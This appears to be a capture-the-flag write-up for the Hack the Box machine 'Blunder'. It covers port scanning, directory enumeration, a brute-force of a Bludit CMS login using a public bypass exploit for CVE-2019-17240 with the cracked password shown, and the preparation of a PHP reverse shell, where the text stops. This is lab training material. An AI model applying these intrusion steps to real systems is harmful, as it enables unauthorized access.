# Hack the Box - Blunder

# Reconnaisance

## NMAP
```CSS
▶ nmap -Pn -sS -O -p- 10.10.10.191 -T4 --min-rate 1000 -oN ports.nmap

Nmap scan report for 10.10.10.191
Host is up (0.19s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http
Device type: general purpose|storage-misc|WAP
Running (JUST GUESSING): Linux 5.X|4.X|2.6.X|3.X (98%), HP embedded (91%), Ubiquiti AirOS 5.X (89%), Ubiquiti embedded (89%)
OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/o:ubnt:airos:5.2.6 cpe:/h:ubnt:airmax_nanostation
Aggressive OS guesses: Linux 5.0 (98%), Linux 5.4 (93%), Linux 5.0 - 5.4 (93%), HP P2000 G3 NAS device (91%), Linux 4.15 - 5.6 (91%), Linux 5.3 - 5.4 (90%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Linux 5.1 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.49 seconds
```

```CSS
▶ nmap -sC -sV -p 21,80 10.10.10.191 -oN services.nmap

Nmap scan report for 10.10.10.191
Host is up (0.18s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
```

---

## HTTP 80
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f70628d0-2b79-45bb-af4e-e683b063aa20)

---

## Content Discovery

```CSS
▶ gobuster dir --url http://10.10.10.191 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --threads 20
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/4075b582-c7ff-44a4-8767-fe978f218cc9)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ae1ef991-a735-481f-ac4e-fbac773d364d)
  - `Bludit` admin login.

```CSS
▶ gobuster dir --url http://10.10.10.191 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --threads 20
```
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c1979746-2805-426a-9824-c5f46d09a09b)
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/3fe67c23-2588-4b30-82d4-0038d697ee17)
  - Probably the CMS is running an older version.
  - Potential username `fergus`.

---

## Brute-Force Credentials
  - A potential username `fergus` is found. Attempt to brute-force the password of this user for the CMS.

![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5486ce91-06ec-466f-b912-f9d4066152f0)
  - IP address gets banned after a few tries to brute-force the password.

### Brute-Force Mitigation Bypass
  - Search for bypassing brute-force protection.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/c7a9919b-9581-433c-b2e9-8670b9fb257c)

  - Google search.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d7d3f417-9f2d-42ab-910e-7430ef76d1fb)
  - Bludit Brute-force Mitigation Bypass (CVE-2019-17240)

  - https://github.com/ColdFusionX/CVE-2019-17240_Bludit-BF-Bypass
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1b80229c-69f6-4496-975e-6bf906725572)

```CSS
▶ python exploit.py -l http://10.10.10.191/admin/login.php -u users.txt -p passwords.txt
```
  - Valid password `RolandDeschain` found for the user `fergus`.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8795423e-82bb-40fe-b9d5-c0caeb7668de)

  - Login successful to Dashboard.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/6fb1a617-4f08-4d12-a236-b860b18cbea5)

---

  - Search for exploits.
  - Bludit RCE - https://github.com/bludit/bludit/issues/1081

  - Upload a php reverse shell to the target machine.
  ```CSS
  ▶ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
  ```

  - Change the IP address and Port in the shell code.
![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f91738d7-102a-4418-b21f-3f3eddac9b06)
